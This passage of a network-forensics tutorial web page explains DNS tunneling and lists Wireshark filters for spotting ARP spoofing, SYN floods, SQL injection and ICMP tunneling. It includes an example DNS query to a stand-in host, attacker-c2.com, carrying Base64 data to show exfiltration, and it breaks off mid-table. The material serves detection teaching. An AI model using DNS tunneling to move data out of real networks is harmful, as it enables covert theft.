      </div>

      <h3>DNS Tunneling</h3>
      <p>
        Attackers use DNS to exfiltrate data or communicate with C2 servers, exploiting the fact that DNS traffic is
        rarely blocked. Data is encoded (Base32/Base64) into subdomain labels of DNS queries. The attacker controls the
        authoritative DNS server for a domain, which decodes the data.
      </p>
      <div class="code-block">
        <pre><span class="comment"># Suspicious DNS query showing Base64-encoded exfiltrated data</span>
Query: <span class="string">aGVsbG8td29ybGQtZXhhbXBsZQ==</span>.attacker-c2.com
       <span class="comment">^ Base64 encoded payload in subdomain</span>

<span class="comment"># Normal DNS query for comparison:</span>
Query: mail.google.com   <span class="comment"># Short, human-readable</span>

<span class="comment"># Detection: length &gt; 50 chars in subdomain label = suspicious</span></pre>
      </div>

      <h3>Other Attack Signatures</h3>
      <table class="data-table">
        <thead>
          <tr>
            <th>Attack Type</th>
            <th>PCAP Signature</th>
            <th>Key Filter</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>ARP Spoofing</td>
            <td>Duplicate ARP replies with different MACs for same IP</td>
            <td><code>arp.duplicate-address-detected</code></td>
          </tr>
          <tr>
            <td>SYN Flood (DoS)</td>
            <td>Thousands of SYN packets, no ACKs from sender</td>
            <td><code>tcp.flags==0x002</code> high count</td>
          </tr>
          <tr>
            <td>SQL Injection</td>
            <td>HTTP POST body contains SQL keywords (SELECT, UNION)</td>
            <td><code>http contains "UNION SELECT"</code></td>
          </tr>
          <tr>
            <td>ICMP Tunneling</td>
            <td>ICMP packets with unusually large payloads (&gt;64 bytes)</td>
            <td><code>icmp &amp;&amp; data.len &gt; 64</code></td>
          </tr>
          <tr>
            <td>Credential Theft</td>
            <td>FTP/Telnet/HTTP Basic Auth sending cleartext passwords</td>
